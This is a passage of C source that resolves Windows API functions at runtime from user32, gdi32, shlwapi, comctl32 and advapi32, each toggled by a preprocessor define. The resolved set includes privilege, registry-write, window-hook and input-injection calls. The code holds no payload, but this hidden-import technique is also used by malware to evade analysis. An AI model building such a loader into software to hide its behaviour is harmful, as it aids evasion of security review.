#ifdef fn_GlobalLock
    DECLARE_SYSTEM_FUNC(GlobalLock, moduleBase);
#endif
#ifdef fn_GlobalUnlock
    DECLARE_SYSTEM_FUNC(GlobalUnlock, moduleBase);
#endif
    DECLARE_SYSTEM_FUNC(GlobalFree, moduleBase);
#ifdef fn_LocalFree
    DECLARE_SYSTEM_FUNC(LocalFree, moduleBase);
#endif
#ifdef fn_ExpandEnvironmentStringsW
    DECLARE_SYSTEM_FUNC(ExpandEnvironmentStringsW, moduleBase);
#endif
#ifdef fn_WTSGetActiveConsoleSessionId
    DECLARE_SYSTEM_FUNC(WTSGetActiveConsoleSessionId, moduleBase);
#endif
#ifdef fn_ProcessIdToSessionId
    DECLARE_SYSTEM_FUNC(ProcessIdToSessionId, moduleBase);
#endif
#ifdef fn_GetLocaleInfoA
    DECLARE_SYSTEM_FUNC(GetLocaleInfoA, moduleBase);
#endif
#ifdef fn_GetWindowsDirectoryW
    DECLARE_SYSTEM_FUNC(GetWindowsDirectoryW, moduleBase);
#endif
#ifdef fn_GetPrivateProfileStringW
    DECLARE_SYSTEM_FUNC(GetPrivateProfileStringW, moduleBase);
#endif
#ifdef fn_GetPrivateProfileSectionNamesW
    DECLARE_SYSTEM_FUNC(GetPrivateProfileSectionNamesW, moduleBase);
#endif
#ifdef fn_GetPrivateProfileIntW
    DECLARE_SYSTEM_FUNC(GetPrivateProfileIntW, moduleBase);
#endif
#ifdef fn_GetFileAttributesExW
    DECLARE_SYSTEM_FUNC(GetFileAttributesExW, moduleBase);
#endif
#ifdef fn_GetLogicalDriveStringsW
    DECLARE_SYSTEM_FUNC(GetLogicalDriveStringsW, moduleBase);
#endif
#ifdef fn_GetDriveTypeW
    DECLARE_SYSTEM_FUNC(GetDriveTypeW, moduleBase);
#endif
#ifdef fn_SetFileAttributesW
    DECLARE_SYSTEM_FUNC(SetFileAttributesW, moduleBase);
#endif
#ifdef fn_GetDateFormatEx
	DECLARE_SYSTEM_FUNC(GetDateFormatEx, moduleBase);
#endif
#ifdef fn_MulDiv
	DECLARE_SYSTEM_FUNC(MulDiv, moduleBase);
#endif
	DECLARE_SYSTEM_FUNC(SwitchToThread, moduleBase);
    DECLARE_SYSTEM_FUNC(SetErrorMode, moduleBase);
    DECLARE_SYSTEM_FUNC(CreateIoCompletionPort, moduleBase);
    DECLARE_SYSTEM_FUNC(GetQueuedCompletionStatus, moduleBase);
    DECLARE_SYSTEM_FUNC(GetQueuedCompletionStatusEx, moduleBase);
    DECLARE_SYSTEM_FUNC(SetFileCompletionNotificationModes, moduleBase);
    DECLARE_SYSTEM_FUNC(CreateSymbolicLinkW, moduleBase);
    DECLARE_SYSTEM_FUNC(CancelIoEx, moduleBase);
    DECLARE_SYSTEM_FUNC(InitializeSRWLock, moduleBase);
    DECLARE_SYSTEM_FUNC(AcquireSRWLockShared, moduleBase);
    DECLARE_SYSTEM_FUNC(AcquireSRWLockExclusive, moduleBase);
    DECLARE_SYSTEM_FUNC(TryAcquireSRWLockShared, moduleBase);
    DECLARE_SYSTEM_FUNC(TryAcquireSRWLockExclusive, moduleBase);
    DECLARE_SYSTEM_FUNC(ReleaseSRWLockShared, moduleBase);
    DECLARE_SYSTEM_FUNC(ReleaseSRWLockExclusive, moduleBase);
    DECLARE_SYSTEM_FUNC(InitializeConditionVariable, moduleBase);
    DECLARE_SYSTEM_FUNC(SleepConditionVariableCS, moduleBase);
    DECLARE_SYSTEM_FUNC(SleepConditionVariableSRW, moduleBase);
    DECLARE_SYSTEM_FUNC(WakeAllConditionVariable, moduleBase);
    DECLARE_SYSTEM_FUNC(WakeConditionVariable, moduleBase);
    DECLARE_SYSTEM_FUNC(GetFileInformationByHandle, moduleBase);
    DECLARE_SYSTEM_FUNC(ReadDirectoryChangesW, moduleBase);
    DECLARE_SYSTEM_FUNC(GetShortPathNameW, moduleBase);
    DECLARE_SYSTEM_FUNC(GetFileType, moduleBase);
    DECLARE_SYSTEM_FUNC(QueueUserWorkItem, moduleBase);
    DECLARE_SYSTEM_FUNC(SetHandleInformation, moduleBase);
    DECLARE_SYSTEM_FUNC(PostQueuedCompletionStatus, moduleBase);
    DECLARE_SYSTEM_FUNC(CancelIo, moduleBase);
    DECLARE_SYSTEM_FUNC(WaitForMultipleObjects, moduleBase);
    DECLARE_SYSTEM_FUNC(CreateNamedPipeA, moduleBase);
    DECLARE_SYSTEM_FUNC(SetNamedPipeHandleState, moduleBase);
    DECLARE_SYSTEM_FUNC(CreateNamedPipeW, moduleBase);
    DECLARE_SYSTEM_FUNC(WaitNamedPipeW, moduleBase);
    DECLARE_SYSTEM_FUNC(ConnectNamedPipe, moduleBase);
    DECLARE_SYSTEM_FUNC(RegisterWaitForSingleObject, moduleBase);
    DECLARE_SYSTEM_FUNC(UnregisterWait, moduleBase);
    DECLARE_SYSTEM_FUNC(GetProcessTimes, moduleBase);
    DECLARE_SYSTEM_FUNC(FileTimeToSystemTime, moduleBase);
    DECLARE_SYSTEM_FUNC(ReleaseSemaphore, moduleBase);
    DECLARE_SYSTEM_FUNC(CreateHardLinkW, moduleBase);
    DECLARE_SYSTEM_FUNC(GetNamedPipeHandleStateW, moduleBase);
    DECLARE_SYSTEM_FUNC(SetFileTime, moduleBase);
    DECLARE_SYSTEM_FUNC(PeekNamedPipe, moduleBase);
    DECLARE_SYSTEM_FUNC(GlobalMemoryStatusEx, moduleBase);
    DECLARE_SYSTEM_FUNC(FormatMessageA, moduleBase);
    DECLARE_SYSTEM_FUNC(GetStdHandle, moduleBase);
    DECLARE_SYSTEM_FUNC(GetConsoleCursorInfo, moduleBase);
    DECLARE_SYSTEM_FUNC(SetConsoleCursorInfo, moduleBase);
    DECLARE_SYSTEM_FUNC(SetConsoleCursorPosition, moduleBase);
    DECLARE_SYSTEM_FUNC(GetConsoleScreenBufferInfo, moduleBase);
    DECLARE_SYSTEM_FUNC(WriteConsoleOutputW, moduleBase);
    DECLARE_SYSTEM_FUNC(SetConsoleTextAttribute, moduleBase);
    DECLARE_SYSTEM_FUNC(WriteConsoleW, moduleBase);
    DECLARE_SYSTEM_FUNC(CancelSynchronousIo, moduleBase);

    if (bOnlyBaseDlls) {
        return 1;
    }

#ifdef FUNCS_USER32
	// user32.dll
	moduleBase = fn_LoadLibraryA("user32.dll");
	if (moduleBase == NULL) {
		return 0;
	}
#ifdef fn_AttachThreadInput
	DECLARE_SYSTEM_FUNC(AttachThreadInput, moduleBase);
#endif
#ifdef fn_EnumChildWindows
	DECLARE_SYSTEM_FUNC(EnumChildWindows, moduleBase);
#endif
#ifdef fn_EnumWindows
	DECLARE_SYSTEM_FUNC(EnumWindows, moduleBase);
#endif
#ifdef fn_GetClassNameW
	DECLARE_SYSTEM_FUNC(GetClassNameW, moduleBase);
#endif
#ifdef fn_GetWindowThreadProcessId
	DECLARE_SYSTEM_FUNC(GetWindowThreadProcessId, moduleBase);
#endif
#ifdef fn_IsWindowVisible
	DECLARE_SYSTEM_FUNC(IsWindowVisible, moduleBase);
#endif
#ifdef fn_MapVirtualKeyA
	DECLARE_SYSTEM_FUNC(MapVirtualKeyA, moduleBase);
#endif
#ifdef fn_PostMessageA
	DECLARE_SYSTEM_FUNC(PostMessageA, moduleBase);
#endif
#ifdef fn_wsprintfA
	DECLARE_SYSTEM_FUNC(wsprintfA, moduleBase);
#endif
#ifdef fn_wsprintfW
	DECLARE_SYSTEM_FUNC(wsprintfW, moduleBase);
#endif
#ifdef fn_RegisterClassExA
	DECLARE_SYSTEM_FUNC(RegisterClassExA, moduleBase);
#endif
#ifdef fn_CreateWindowExA
	DECLARE_SYSTEM_FUNC(CreateWindowExA, moduleBase);
#endif
#ifdef fn_CreateWindowExW
	DECLARE_SYSTEM_FUNC(CreateWindowExW, moduleBase);
#endif
#ifdef fn_GetDC
	DECLARE_SYSTEM_FUNC(GetDC, moduleBase);
#endif
#ifdef fn_ReleaseDC
	DECLARE_SYSTEM_FUNC(ReleaseDC, moduleBase);
#endif
#ifdef fn_DestroyWindow
	DECLARE_SYSTEM_FUNC(DestroyWindow, moduleBase);
#endif
#ifdef fn_DefWindowProcW
	DECLARE_SYSTEM_FUNC(DefWindowProcW, moduleBase);
#endif
#ifdef fn_ExitWindowsEx
	DECLARE_SYSTEM_FUNC(ExitWindowsEx, moduleBase);
#endif
#ifdef fn_GetWindowTextW
	DECLARE_SYSTEM_FUNC(GetWindowTextW, moduleBase);
#endif
#ifdef fn_GetWindowRect
	DECLARE_SYSTEM_FUNC(GetWindowRect, moduleBase);
#endif
#ifdef fn_mouse_event
	DECLARE_SYSTEM_FUNC(mouse_event, moduleBase);
#endif
#ifdef fn_SetWindowLongA
	DECLARE_SYSTEM_FUNC(SetWindowLongA, moduleBase);
#endif
#ifdef fn_SetWindowLongW
	DECLARE_SYSTEM_FUNC(SetWindowLongW, moduleBase);
#endif
#ifdef fn_GetWindowLongA
	DECLARE_SYSTEM_FUNC(GetWindowLongA, moduleBase);
#endif
#ifdef fn_GetWindowLongW
	DECLARE_SYSTEM_FUNC(GetWindowLongW, moduleBase);
#endif
#if defined(_WIN64) && defined(fn_SetWindowLongPtrA)
	DECLARE_SYSTEM_FUNC(SetWindowLongPtrA, moduleBase);
#endif
#if defined(_WIN64) && defined(fn_SetWindowLongPtrW)
	DECLARE_SYSTEM_FUNC(SetWindowLongPtrW, moduleBase);
#endif
#if defined(_WIN64) && defined(fn_GetWindowLongPtrA)
	DECLARE_SYSTEM_FUNC(GetWindowLongPtrA, moduleBase);
#endif
#if defined(_WIN64) && defined(fn_GetWindowLongPtrW)
	DECLARE_SYSTEM_FUNC(GetWindowLongPtrW, moduleBase);
#endif
#ifdef fn_SendNotifyMessageA
	DECLARE_SYSTEM_FUNC(SendNotifyMessageA, moduleBase);
#endif
#ifdef fn_FindWindowA
	DECLARE_SYSTEM_FUNC(FindWindowA, moduleBase);
#endif
#ifdef fn_MessageBoxA
	DECLARE_SYSTEM_FUNC(MessageBoxA, moduleBase);
#endif
#ifdef fn_MessageBoxW
	DECLARE_SYSTEM_FUNC(MessageBoxW, moduleBase);
#endif
#ifdef fn_wvsprintfA
	DECLARE_SYSTEM_FUNC(wvsprintfA, moduleBase);
#endif
#ifdef fn_wvsprintfW
	DECLARE_SYSTEM_FUNC(wvsprintfW, moduleBase);
#endif
#ifdef fn_OffsetRect
	DECLARE_SYSTEM_FUNC(OffsetRect, moduleBase);
#endif
#ifdef fn_InflateRect
	DECLARE_SYSTEM_FUNC(InflateRect, moduleBase);
#endif
#ifdef fn_UnionRect
	DECLARE_SYSTEM_FUNC(UnionRect, moduleBase);
#endif
#ifdef fn_SetCursor
	DECLARE_SYSTEM_FUNC(SetCursor, moduleBase);
#endif
#ifdef fn_LoadCursorW
	DECLARE_SYSTEM_FUNC(LoadCursorW, moduleBase);
#endif
#ifdef fn_EnumDisplayMonitors
	DECLARE_SYSTEM_FUNC(EnumDisplayMonitors, moduleBase);
#endif
#ifdef fn_GetKeyState
	DECLARE_SYSTEM_FUNC(GetKeyState, moduleBase);
#endif
#ifdef fn_IsWindow
	DECLARE_SYSTEM_FUNC(IsWindow, moduleBase);
#endif
#ifdef fn_SetTimer
	DECLARE_SYSTEM_FUNC(SetTimer, moduleBase);
#endif
#ifdef fn_KillTimer
	DECLARE_SYSTEM_FUNC(KillTimer, moduleBase);
#endif
#ifdef fn_GetClientRect
	DECLARE_SYSTEM_FUNC(GetClientRect, moduleBase);
#endif
#ifdef fn_GetWindow
	DECLARE_SYSTEM_FUNC(GetWindow, moduleBase);
#endif
#ifdef fn_SetWindowPos
	DECLARE_SYSTEM_FUNC(SetWindowPos, moduleBase);
#endif
#ifdef fn_SetLayeredWindowAttributes
	DECLARE_SYSTEM_FUNC(SetLayeredWindowAttributes, moduleBase);
#endif
#ifdef fn_GetCursorPos
	DECLARE_SYSTEM_FUNC(GetCursorPos, moduleBase);
#endif
#ifdef fn_ScreenToClient
	DECLARE_SYSTEM_FUNC(ScreenToClient, moduleBase);
#endif
#ifdef fn_SendMessageW
	DECLARE_SYSTEM_FUNC(SendMessageW, moduleBase);
#endif
#ifdef fn_MapWindowPoints
	DECLARE_SYSTEM_FUNC(MapWindowPoints, moduleBase);
#endif
#ifdef fn_InvalidateRect
	DECLARE_SYSTEM_FUNC(InvalidateRect, moduleBase);
#endif
#ifdef fn_SetCapture
	DECLARE_SYSTEM_FUNC(SetCapture, moduleBase);
#endif
#ifdef fn_ReleaseCapture
	DECLARE_SYSTEM_FUNC(ReleaseCapture, moduleBase);
#endif
#ifdef fn_BeginPaint
	DECLARE_SYSTEM_FUNC(BeginPaint, moduleBase);
#endif
#ifdef fn_EndPaint
	DECLARE_SYSTEM_FUNC(EndPaint, moduleBase);
#endif
#ifdef fn_IsRectEmpty
	DECLARE_SYSTEM_FUNC(IsRectEmpty, moduleBase);
#endif
#ifdef fn_GetUpdateRect
	DECLARE_SYSTEM_FUNC(GetUpdateRect, moduleBase);
#endif
#ifdef fn_SetFocus
	DECLARE_SYSTEM_FUNC(SetFocus, moduleBase);
#endif
#ifdef fn_GetFocus
	DECLARE_SYSTEM_FUNC(GetFocus, moduleBase);
#endif
#ifdef fn_GetMessageW
	DECLARE_SYSTEM_FUNC(GetMessageW, moduleBase);
#endif
#ifdef fn_DispatchMessageW
	DECLARE_SYSTEM_FUNC(DispatchMessageW, moduleBase);
#endif
#ifdef fn_TranslateMessage
	DECLARE_SYSTEM_FUNC(TranslateMessage, moduleBase);
#endif
#ifdef fn_PostMessageW
	DECLARE_SYSTEM_FUNC(PostMessageW, moduleBase);
#endif
#ifdef fn_PtInRect
	DECLARE_SYSTEM_FUNC(PtInRect, moduleBase);
#endif
#ifdef fn_GetParent
	DECLARE_SYSTEM_FUNC(GetParent, moduleBase);
#endif
#ifdef fn_ShowWindow
	DECLARE_SYSTEM_FUNC(ShowWindow, moduleBase);
#endif
#ifdef fn_EnableWindow
	DECLARE_SYSTEM_FUNC(EnableWindow, moduleBase);
#endif
#ifdef fn_PostQuitMessage
	DECLARE_SYSTEM_FUNC(PostQuitMessage, moduleBase);
#endif
#ifdef fn_SystemParametersInfoW
	DECLARE_SYSTEM_FUNC(SystemParametersInfoW, moduleBase);
#endif
#ifdef fn_LoadImageW
	DECLARE_SYSTEM_FUNC(LoadImageW, moduleBase);
#endif
#ifdef fn_GetSystemMetrics
	DECLARE_SYSTEM_FUNC(GetSystemMetrics, moduleBase);
#endif
#ifdef fn_RegisterClassW
	DECLARE_SYSTEM_FUNC(RegisterClassW, moduleBase);
#endif
#ifdef fn_RegisterClassExW
	DECLARE_SYSTEM_FUNC(RegisterClassExW, moduleBase);
#endif
#ifdef fn_GetClassInfoExW
	DECLARE_SYSTEM_FUNC(GetClassInfoExW, moduleBase);
#endif
#ifdef fn_CallWindowProcW
	DECLARE_SYSTEM_FUNC(CallWindowProcW, moduleBase);
#endif
#ifdef fn_GetPropW
	DECLARE_SYSTEM_FUNC(GetPropW, moduleBase);
#endif
#ifdef fn_SetPropW
	DECLARE_SYSTEM_FUNC(SetPropW, moduleBase);
#endif
#ifdef fn_AdjustWindowRectEx
	DECLARE_SYSTEM_FUNC(AdjustWindowRectEx, moduleBase);
#endif
#ifdef fn_GetMenu
	DECLARE_SYSTEM_FUNC(GetMenu, moduleBase);
#endif
#ifdef fn_IntersectRect
	DECLARE_SYSTEM_FUNC(IntersectRect, moduleBase);
#endif
#ifdef fn_CharNextW
	DECLARE_SYSTEM_FUNC(CharNextW, moduleBase);
#endif
#ifdef fn_CharPrevW
	DECLARE_SYSTEM_FUNC(CharPrevW, moduleBase);
#endif
#ifdef fn_FillRect
	DECLARE_SYSTEM_FUNC(FillRect, moduleBase);
#endif
#ifdef fn_SetRect
	DECLARE_SYSTEM_FUNC(SetRect, moduleBase);
#endif
#ifdef fn_IsIconic
	DECLARE_SYSTEM_FUNC(IsIconic, moduleBase);
#endif
#ifdef fn_GetMonitorInfoW
	DECLARE_SYSTEM_FUNC(GetMonitorInfoW, moduleBase);
#endif
#ifdef fn_MonitorFromWindow
	DECLARE_SYSTEM_FUNC(MonitorFromWindow, moduleBase);
#endif
#ifdef fn_SetWindowRgn
	DECLARE_SYSTEM_FUNC(SetWindowRgn, moduleBase);
#endif
#ifdef fn_IsZoomed
	DECLARE_SYSTEM_FUNC(IsZoomed, moduleBase);
#endif
#ifdef fn_SetWindowsHookExW
	DECLARE_SYSTEM_FUNC(SetWindowsHookExW, moduleBase);
#endif
#ifdef fn_CallNextHookEx
	DECLARE_SYSTEM_FUNC(CallNextHookEx, moduleBase);
#endif
#ifdef fn_UnhookWindowsHookEx
	DECLARE_SYSTEM_FUNC(UnhookWindowsHookEx, moduleBase);
#endif
#ifdef fn_FindWindowExA
	DECLARE_SYSTEM_FUNC(FindWindowExA, moduleBase);
#endif
#ifdef fn_DrawTextW
	DECLARE_SYSTEM_FUNC(DrawTextW, moduleBase);
#endif
#ifdef fn_CharUpperW
	DECLARE_SYSTEM_FUNC(CharUpperW, moduleBase);
#endif
#ifdef fn_CharLowerW
	DECLARE_SYSTEM_FUNC(CharLowerW, moduleBase);
#endif
#ifdef fn_ClientToScreen
	DECLARE_SYSTEM_FUNC(ClientToScreen, moduleBase);
#endif
#ifdef fn_SendInput
	DECLARE_SYSTEM_FUNC(SendInput, moduleBase);
#endif
#ifdef fn_SetWindowTextW
	DECLARE_SYSTEM_FUNC(SetWindowTextW, moduleBase);
#endif
#ifdef fn_GetWindowTextW
	DECLARE_SYSTEM_FUNC(GetWindowTextW, moduleBase);
#endif
#ifdef fn_GetWindowTextLengthW
	DECLARE_SYSTEM_FUNC(GetWindowTextLengthW, moduleBase);
#endif
#ifdef fn_CreateIconIndirect
	DECLARE_SYSTEM_FUNC(CreateIconIndirect, moduleBase);
#endif
#ifdef fn_DestroyIcon
	DECLARE_SYSTEM_FUNC(DestroyIcon, moduleBase);
#endif
#ifdef fn_RegisterWindowMessageW
	DECLARE_SYSTEM_FUNC(RegisterWindowMessageW, moduleBase);
#endif
#ifdef fn_GetIconInfo
	DECLARE_SYSTEM_FUNC(GetIconInfo, moduleBase);
#endif
#ifdef fn_DrawIconEx
	DECLARE_SYSTEM_FUNC(DrawIconEx, moduleBase);
#endif
#ifdef fn_MoveWindow
	DECLARE_SYSTEM_FUNC(MoveWindow, moduleBase);
#endif
#ifdef fn_CreateAcceleratorTableW
	DECLARE_SYSTEM_FUNC(CreateAcceleratorTableW, moduleBase);
#endif
#ifdef fn_InvalidateRgn
	DECLARE_SYSTEM_FUNC(InvalidateRgn, moduleBase);
#endif
    DECLARE_SYSTEM_FUNC(GetForegroundWindow, moduleBase);

#endif // FUNCS_USER32


#ifdef FUNCS_SHLWAPI
    // shlwapi.dll
    moduleBase = fn_LoadLibraryA("shlwapi.dll");
    if (moduleBase == NULL) {
        return 0;
    }
#ifdef fn_PathCombineW
    DECLARE_SYSTEM_FUNC(PathCombineW, moduleBase);
#endif
#ifdef fn_PathAppendW
    DECLARE_SYSTEM_FUNC(PathAppendW, moduleBase);
#endif
#ifdef fn_PathRemoveFileSpecW
    DECLARE_SYSTEM_FUNC(PathRemoveFileSpecW, moduleBase);
#endif
#ifdef fn_PathFindFileNameA
    DECLARE_SYSTEM_FUNC(PathFindFileNameA, moduleBase);
#endif
#ifdef fn_PathFindFileNameW
    DECLARE_SYSTEM_FUNC(PathFindFileNameW, moduleBase);
#endif
#ifdef fn_StrToIntA
    DECLARE_SYSTEM_FUNC(StrToIntA, moduleBase);
#endif
#ifdef fn_StrToIntW
    DECLARE_SYSTEM_FUNC(StrToIntW, moduleBase);
#endif
#ifdef fn_StrToInt64ExA
    DECLARE_SYSTEM_FUNC(StrToInt64ExA, moduleBase);
#endif
#ifdef fn_StrCmpIW
    DECLARE_SYSTEM_FUNC(StrCmpIW, moduleBase);
#endif
#ifdef fn_StrCmpNIW
    DECLARE_SYSTEM_FUNC(StrCmpNIW, moduleBase);
#endif
#ifdef fn_StrStrW
    DECLARE_SYSTEM_FUNC(StrStrW, moduleBase);
#endif
#ifdef fn_StrCmpNW
    DECLARE_SYSTEM_FUNC(StrCmpNW, moduleBase);
#endif
#ifdef fn_wvnsprintfW
    DECLARE_SYSTEM_FUNC(wvnsprintfW, moduleBase);
#endif
#ifdef fn_StrStrIW
    DECLARE_SYSTEM_FUNC(StrStrIW, moduleBase);
#endif
#ifdef fn_StrRChrIW
    DECLARE_SYSTEM_FUNC(StrRChrIW, moduleBase);
#endif
#ifdef fn_StrStrIA
    DECLARE_SYSTEM_FUNC(StrStrIA, moduleBase);
#endif
#ifdef fn_wnsprintfW
    DECLARE_SYSTEM_FUNC(wnsprintfW, moduleBase);
#endif
#ifdef fn_StrStrA
    DECLARE_SYSTEM_FUNC(StrStrA, moduleBase);
#endif
#ifdef fn_StrCmpNIA
    DECLARE_SYSTEM_FUNC(StrCmpNIA, moduleBase);
#endif
#ifdef fn_StrChrA
    DECLARE_SYSTEM_FUNC(StrChrA, moduleBase);
#endif
#endif // FUNCS_SHLWAPI

#ifdef FUNCS_GDI32

    // gdi32.dll
    moduleBase = fn_LoadLibraryA("gdi32.dll");
    if (moduleBase == NULL) {
		LOG("Can't get base of gdi32.dll (error: %08x)", fn_GetLastError());
        return 0;
    }
	LOG("gdi32.dll module base = %08x", moduleBase);

#ifdef fn_GetObjectW
    DECLARE_SYSTEM_FUNC(GetObjectW, moduleBase);
#endif
#ifdef fn_GetObjectA
    DECLARE_SYSTEM_FUNC(GetObjectA, moduleBase);
#endif

#ifdef fn_GetStockObject
    DECLARE_SYSTEM_FUNC(GetStockObject, moduleBase);
#endif
#ifdef fn_CreateFontIndirectW
    DECLARE_SYSTEM_FUNC(CreateFontIndirectW, moduleBase);
#endif
#ifdef fn_CreatePen
    DECLARE_SYSTEM_FUNC(CreatePen, moduleBase);
#endif
#ifdef fn_SelectObject
    DECLARE_SYSTEM_FUNC(SelectObject, moduleBase);
#endif
#ifdef fn_DeleteObject
    DECLARE_SYSTEM_FUNC(DeleteObject, moduleBase);
#endif
#ifdef fn_DeleteDC
    DECLARE_SYSTEM_FUNC(DeleteDC, moduleBase);
#endif
#ifdef fn_SaveDC
    DECLARE_SYSTEM_FUNC(SaveDC, moduleBase);
#endif
#ifdef fn_RestoreDC
    DECLARE_SYSTEM_FUNC(RestoreDC, moduleBase);
#endif
#ifdef fn_SetWindowOrgEx
    DECLARE_SYSTEM_FUNC(SetWindowOrgEx, moduleBase);
#endif
#ifdef fn_Rectangle
    DECLARE_SYSTEM_FUNC(Rectangle, moduleBase);
#endif
#ifdef fn_BitBlt
    DECLARE_SYSTEM_FUNC(BitBlt, moduleBase);
#endif
#ifdef fn_CreateCompatibleBitmap
    DECLARE_SYSTEM_FUNC(CreateCompatibleBitmap, moduleBase);
#endif
#ifdef fn_CreateCompatibleDC
    DECLARE_SYSTEM_FUNC(CreateCompatibleDC, moduleBase);
#endif
#ifdef fn_GetTextMetricsW
    DECLARE_SYSTEM_FUNC(GetTextMetricsW, moduleBase);
#endif
#ifdef fn_SelectClipRgn
    DECLARE_SYSTEM_FUNC(SelectClipRgn, moduleBase);
#endif
#ifdef fn_GetObjectType
    DECLARE_SYSTEM_FUNC(GetObjectType, moduleBase);
#endif
#ifdef fn_ExtSelectClipRgn
    DECLARE_SYSTEM_FUNC(ExtSelectClipRgn, moduleBase);
#endif
#ifdef fn_CreateRectRgnIndirect
    DECLARE_SYSTEM_FUNC(CreateRectRgnIndirect, moduleBase);
#endif
#ifdef fn_GetClipBox
    DECLARE_SYSTEM_FUNC(GetClipBox, moduleBase);
#endif
#ifdef fn_CombineRgn
    DECLARE_SYSTEM_FUNC(CombineRgn, moduleBase);
#endif
#ifdef fn_CreateRoundRectRgn
    DECLARE_SYSTEM_FUNC(CreateRoundRectRgn, moduleBase);
#endif
#ifdef fn_CreateSolidBrush
    DECLARE_SYSTEM_FUNC(CreateSolidBrush, moduleBase);
#endif
#ifdef fn_CreateDIBSection
    DECLARE_SYSTEM_FUNC(CreateDIBSection, moduleBase);
#endif
#ifdef fn_StretchBlt
    DECLARE_SYSTEM_FUNC(StretchBlt, moduleBase);
#endif
#ifdef fn_MoveToEx
    DECLARE_SYSTEM_FUNC(MoveToEx, moduleBase);
#endif
#ifdef fn_LineTo
    DECLARE_SYSTEM_FUNC(LineTo, moduleBase);
#endif
#ifdef fn_CreatePenIndirect
    DECLARE_SYSTEM_FUNC(CreatePenIndirect, moduleBase);
#endif
#ifdef fn_RoundRect
    DECLARE_SYSTEM_FUNC(RoundRect, moduleBase);
#endif
#ifdef fn_SetTextColor
    DECLARE_SYSTEM_FUNC(SetTextColor, moduleBase);
#endif
#ifdef fn_SetBkMode
    DECLARE_SYSTEM_FUNC(SetBkMode, moduleBase);
#endif
#ifdef fn_TextOutW
    DECLARE_SYSTEM_FUNC(TextOutW, moduleBase);
#endif
#ifdef fn_GetTextExtentPoint32W
    DECLARE_SYSTEM_FUNC(GetTextExtentPoint32W, moduleBase);
#endif
#ifdef fn_GetCharABCWidthsW
    DECLARE_SYSTEM_FUNC(GetCharABCWidthsW, moduleBase);
#endif
#ifdef fn_SetBkColor
    DECLARE_SYSTEM_FUNC(SetBkColor, moduleBase);
#endif
#ifdef fn_GdiFlush
    DECLARE_SYSTEM_FUNC(GdiFlush, moduleBase);
#endif
#ifdef fn_SetStretchBltMode
    DECLARE_SYSTEM_FUNC(SetStretchBltMode, moduleBase);
#endif
#ifdef fn_ExtTextOutW
    DECLARE_SYSTEM_FUNC(ExtTextOutW, moduleBase);
#endif
#ifdef fn_GetPixel
	DECLARE_SYSTEM_FUNC(GetPixel, moduleBase);
#endif
#ifdef fn_SetPixel
	DECLARE_SYSTEM_FUNC(SetPixel, moduleBase);
#endif
#ifdef fn_GetDeviceCaps
	DECLARE_SYSTEM_FUNC(GetDeviceCaps, moduleBase);
#endif
    
#endif // FUNCS_GDI32


#ifdef FUNCS_COMCTL32

    // comctl32.dll
    moduleBase = fn_LoadLibraryA("comctl32.dll");
    if (moduleBase == NULL) {
		LOG("Can't get base of comctl32.dll (error: %08x)", fn_GetLastError());
        return 0;
    }
	LOG("comctl32.dll module base = %08x", moduleBase);

#ifdef fn_InitCommonControlsEx
    DECLARE_SYSTEM_FUNC(InitCommonControlsEx, moduleBase);
#endif
#ifdef fn__TrackMouseEvent
    DECLARE_SYSTEM_FUNC(_TrackMouseEvent, moduleBase);
#endif

#endif // FUNCS_COMCTL32

#ifdef FUNCS_ADVAPI32
    // advapi32.dll
    moduleBase = fn_LoadLibraryA("advapi32.dll");
    if (moduleBase == NULL) {
		LOG("Can't get advapi.dll base (error: %08x)", fn_GetLastError());
        return 0;
    }
	LOG("advapi32.dll module base = %08x", moduleBase);
#ifdef fn_RegEnumKeyExA
    DECLARE_SYSTEM_FUNC(RegEnumKeyExA, moduleBase);
#endif
#ifdef fn_RegOpenKeyExA
    DECLARE_SYSTEM_FUNC(RegOpenKeyExA, moduleBase);
#endif
#ifdef fn_RegQueryValueExA
    DECLARE_SYSTEM_FUNC(RegQueryValueExA, moduleBase);
#endif
#ifdef fn_ConvertStringSidToSidW
    DECLARE_SYSTEM_FUNC(ConvertStringSidToSidW, moduleBase);
#endif
#ifdef fn_AdjustTokenPrivileges
    DECLARE_SYSTEM_FUNC(AdjustTokenPrivileges, moduleBase);
#endif
#ifdef fn_AllocateAndInitializeSid
    DECLARE_SYSTEM_FUNC(AllocateAndInitializeSid, moduleBase);
#endif
#ifdef fn_EqualSid
    DECLARE_SYSTEM_FUNC(EqualSid, moduleBase);
#endif
#ifdef fn_FreeSid
    DECLARE_SYSTEM_FUNC(FreeSid, moduleBase);
#endif
#ifdef fn_GetLengthSid
    DECLARE_SYSTEM_FUNC(GetLengthSid, moduleBase);
#endif
#ifdef fn_GetSidSubAuthority
    DECLARE_SYSTEM_FUNC(GetSidSubAuthority, moduleBase);
#endif
#ifdef fn_GetSidSubAuthorityCount
    DECLARE_SYSTEM_FUNC(GetSidSubAuthorityCount, moduleBase);
#endif
#ifdef fn_GetTokenInformation
    DECLARE_SYSTEM_FUNC(GetTokenInformation, moduleBase);
#endif
#ifdef fn_LookupAccountSidA
    DECLARE_SYSTEM_FUNC(LookupAccountSidA, moduleBase);
#endif
#ifdef fn_LookupPrivilegeNameW
    DECLARE_SYSTEM_FUNC(LookupPrivilegeNameW, moduleBase);
#endif
#ifdef fn_LookupPrivilegeValueA
    DECLARE_SYSTEM_FUNC(LookupPrivilegeValueA, moduleBase);
#endif
#ifdef fn_OpenProcessToken
    DECLARE_SYSTEM_FUNC(OpenProcessToken, moduleBase);
#endif
#ifdef fn_OpenThreadToken
	DECLARE_SYSTEM_FUNC(OpenThreadToken, moduleBase);
#endif
#ifdef fn_SetTokenInformation
    DECLARE_SYSTEM_FUNC(SetTokenInformation, moduleBase);
#endif
#ifdef fn_RegCreateKeyExW
    DECLARE_SYSTEM_FUNC(RegCreateKeyExW, moduleBase);
#endif
#ifdef fn_RegDeleteValueW
    DECLARE_SYSTEM_FUNC(RegDeleteValueW, moduleBase);
#endif
#ifdef fn_RegSetValueExW
    DECLARE_SYSTEM_FUNC(RegSetValueExW, moduleBase);
#endif
#ifdef fn_RegCloseKey
    DECLARE_SYSTEM_FUNC(RegCloseKey, moduleBase);
#endif
#ifdef fn_RegOpenKeyExW
    DECLARE_SYSTEM_FUNC(RegOpenKeyExW, moduleBase);
#endif
#ifdef fn_RegQueryValueExW
    DECLARE_SYSTEM_FUNC(RegQueryValueExW, moduleBase);
#endif
#ifdef fn_RegEnumKeyExW
    DECLARE_SYSTEM_FUNC(RegEnumKeyExW, moduleBase);
#endif
#ifdef fn_IsTextUnicode
    DECLARE_SYSTEM_FUNC(IsTextUnicode, moduleBase);
#endif
#ifdef fn_RegOpenKeyA
